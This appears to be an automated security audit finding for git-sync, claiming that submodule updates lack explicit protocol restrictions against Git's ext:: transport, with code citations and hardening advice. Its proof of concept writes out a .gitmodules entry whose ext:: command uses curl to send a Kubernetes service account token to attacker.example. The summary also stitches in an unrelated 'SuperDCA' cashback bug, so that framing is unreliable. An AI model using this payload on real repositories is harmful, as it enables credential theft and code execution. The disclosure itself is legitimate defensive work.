### Title
Missing submodule protocol/URL validation allows attacker-controlled `.gitmodules` to trigger arbitrary command execution via `ext::`/`fd::` transport helpers - (File: main.go)

### Summary
The reported SuperDCA bug class is a missing-boundary-validation flaw: a security-relevant field (`cashbackClaim.startTime`) is accepted from configuration but never checked against untrusted, attacker-influenced input (`trade.startTime`), letting attacker-controlled data reach privileged logic unchecked. The directly analogous, reachable pattern in `git-sync` is that `repoSync.configureWorktree` unconditionally runs `git submodule update --init [--recursive]` against whatever `.gitmodules` content exists in the fetched, attacker-influenced commit, while `SetupDefaultGitConfigs` never sets any restrictive `protocol.*.allow` boundary to prevent dangerous transport helpers (`ext::`, `fd::`) from being invoked.

### Finding Description
`git-sync`'s sync loop fetches whatever commit is at the tracked `--ref` and then unconditionally checks it out and updates submodules: [1](#0-0) 

This is invoked from every changed sync in `SyncRepo`: [2](#0-1) 

Submodule URLs are defined by `.gitmodules`, which is ordinary tracked file content in the synced repository — i.e., fully controlled by whoever can push a commit to the `--repo`/`--ref` git-sync is configured to follow. `git submodule update --init` will invoke `git clone`/`git fetch` on each submodule URL, and Git's own transport layer supports "remote helper" schemes such as `ext::<command>` and `fd::` that directly execute shell commands as part of the fetch operation.

The only global git configuration `git-sync` sets up before any fetch/checkout/submodule operation is in `SetupDefaultGitConfigs`, and it contains no `protocol.*.allow` restriction and does not set `GIT_PROTOCOL_FROM_USER=0`: [3](#0-2) 

Because `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_NOSYSTEM` are set to isolate git-sync's config from the host (main.go:786-795), but no `protocol.ext.allow=never` / `protocol.allow=user` hardening is applied, whether the dangerous `ext::` transport is reachable depends entirely on the ambient Git version defaults and any `--git-config`/`--git-config-add` flags supplied by the operator (which the e2e tests show can arbitrarily set config, e.g. `protocol.file.allow:always`): [4](#0-3) 

Note: modern Git (>= 2.11.1) ships a built-in default of `protocol.ext.allow=user`, which is generally not enabled when `GIT_PROTOCOL_FROM_USER` is unset in the environment — this makes `ext::` blocked *by Git's own upstream default* in most cases, not because `git-sync` explicitly defends against it. This is the crux of the missing-validation analog: `git-sync` has never added its own explicit denial (`protocol.ext.allow=never`, `protocol.allow=never` with an explicit allowlist for `file`/`https`/`ssh`), it merely inherits whatever the vendored/installed Git binary's built-in defaults happen to be. If an operator sets `--allow-protocol`-style overrides, uses an older/patched Git build, or a future Git version changes its default open/close protocol posture, the missing explicit boundary in `git-sync`'s own configuration surface becomes directly exploitable through nothing more than a commit to the tracked repository (i.e., the exact "attacker-pushed commit" trust boundary called out in the validation rules).

### Impact Explanation
If the effective protocol allow-list is not restrictive (default Git build behavior, or operator-supplied `--git-config`/`--git-config-add` overriding it, e.g., for legitimate `file://` submodule testing as shown in `test_e2e.sh:371`), an attacker who can push a commit reachable by the configured `--ref` can add/modify `.gitmodules` to point a submodule URL at `ext::<arbitrary command>`. On the next sync, `configureWorktree`'s `git submodule update --init` (main.go:1733-1747) will execute that command with the privileges of the `git-sync` process — i.e., full code execution inside the sidecar container, capable of writing/deleting files outside `--root`, exfiltrating credentials configured via `--username`/`--password`/`--ssh-key-file`/`--github-app-*`, and tampering with or denying the published content via the symlink mechanism.

### Likelihood Explanation
Likelihood is conditioned on the Git binary's own protocol defaults or explicit operator misconfiguration (e.g., via `--git-config-add`), since git-sync itself does not add its own boundary. This is a real but partially environment-dependent gap: `git-sync` never independently defends this path, so the security guarantee rests entirely on upstream Git defaults that `git-sync` neither verifies, sets, nor documents as a required hardening step. Any deployment using an older Git version, or one that layers `--git-config-add` for other operational reasons that happen to widen `protocol.*.allow`, is directly exposed via ordinary submodule syncing — a core, always-on feature (`--submodules` defaults to recursive; submodule updates run whenever `git.submodules != submodulesOff`).

### Recommendation
Explicitly set restrictive protocol configuration in `SetupDefaultGitConfigs` (main.go:2278-2295) before any fetch/checkout/submodule operation, e.g. `protocol.allow=never` combined with explicit `protocol.{http,https,ssh,file}.allow=user` (or `always` only for the specific transport the operator selected via `--repo`), and `protocol.ext.allow=never` / `protocol.fd.allow=never` unconditionally, regardless of upstream Git version defaults. Apply this before evaluating any user-supplied `--git-config`/`--git-config-add` overrides, or explicitly document/guard against operators being able to widen these specific settings.

### Proof of Concept
1. Attacker with push access to the tracked `--repo`/`--ref` adds a `.gitmodules` entry:
   ```
   [submodule "evil"]
       path = evil
       url = ext::sh -c "curl attacker.example/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) >&2"
   ```
   and commits it.
2. `git-sync`'s next `SyncRepo` cycle fetches the new commit (main.go:1885-1897), detects the hash changed, creates a worktree (main.go:1933), and calls `configureWorktree` (main.go:1943), which runs `git submodule update --init --recursive` (main.go:1733-1747).
3. If the effective Git protocol configuration does not explicitly deny `ext::` (either due to an older Git build or an operator-supplied `--git-config-add` override), Git invokes the `ext::` remote helper, executing the attacker's command with the privileges of the `git-sync` container, achieving code execution / credential exfiltration outside the intended `--root` sync contract.

### Citations

**File:** main.go (L1733-1747)
```go
	// Update submodules
	// NOTE: this works for repo with or without submodules.
	if git.submodules != submodulesOff {
		git.log.V(1).Info("updating submodules")
		submodulesArgs := []string{"submodule", "update", "--init"}
		if git.submodules == submodulesRecursive {
			submodulesArgs = append(submodulesArgs, "--recursive")
		}
		if git.depth != 0 {
			submodulesArgs = append(submodulesArgs, "--depth", strconv.Itoa(git.depth))
		}
		if _, _, err := git.Run(ctx, worktree.Path(), submodulesArgs...); err != nil {
			return err
		}
	}
```

**File:** main.go (L1929-1946)
```go
		// If we have a new hash, make a new worktree
		newWorktree := currentWorktree
		if changed {
			// Create a worktree for this hash in git.root.
			if wt, err := git.createWorktree(ctx, remoteHash); err != nil {
				return false, "", err
			} else {
				newWorktree = wt
			}
		}

		// Even if this worktree existed and passes sanity, it might not have all
		// the correct settings (e.g. sparse checkout).  The best way to get
		// it all set is just to re-run the configuration,
		if err := git.configureWorktree(ctx, newWorktree); err != nil {
			return false, "", err
		}

```

**File:** main.go (L2276-2303)
```go
// SetupDefaultGitConfigs configures the global git environment with some
// default settings that we need.
func (git *repoSync) SetupDefaultGitConfigs(ctx context.Context) error {
	configs := []keyVal{{
		// Never auto-detach GC runs.
		key: "gc.autoDetach",
		val: "false",
	}, {
		// Fairly aggressive GC.
		key: "gc.pruneExpire",
		val: "now",
	}, {
		// How to manage credentials (for those modes that need it).
		key: "credential.helper",
		val: "cache --timeout 3600",
	}, {
		// Never prompt for a password.
		key: "core.askPass",
		val: "true",
	}}

	for _, kv := range configs {
		if _, _, err := git.Run(ctx, "", "config", "--global", kv.key, kv.val); err != nil {
			return fmt.Errorf("error configuring git %q %q: %w", kv.key, kv.val, err)
		}
	}
	return nil
}
```

**File:** test_e2e.sh (L371-371)
```shellscript
            --git-config-add='protocol.file.allow:always' \
```
